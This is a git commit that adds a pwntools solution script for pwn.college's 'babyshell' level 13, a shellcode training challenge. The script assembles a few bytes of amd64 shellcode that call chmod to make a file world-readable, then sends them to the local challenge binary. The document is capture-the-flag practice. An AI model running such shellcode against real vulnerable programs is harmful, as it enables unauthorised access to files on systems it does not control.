37861ba882ef64ae79a36c7cc6bdaec8a48814d7
Pratik Devkota <reusedbottle@proton.me>
2022-08-01 23:54:05 +0545

    Completed pwn.college/babyshell/13.py

---
+++ pwn.college/babyshell/13.py
@@ -0,0 +1,23 @@
+from pwn import *
+
+# set some context
+context.arch = "amd64"
+context.encoding = "latin"
+# ignore warnings
+warnings.simplefilter("ignore")
+
+# assembly goes here, most of the rest is boilerplate
+assembly = f"""
+mov al, SYS_chmod
+push 0x41
+push rsp
+pop rdi
+mov si, 0x1ff
+syscall
+"""
+
+# the hostname will always be the same as challenge binary
+with process(f"/challenge/{os.getenv('HOSTNAME')}") as target:
+    info( target.readrepeat(1) )
+    target.send( asm(assembly) )
+    info( target.readrepeat(1) )
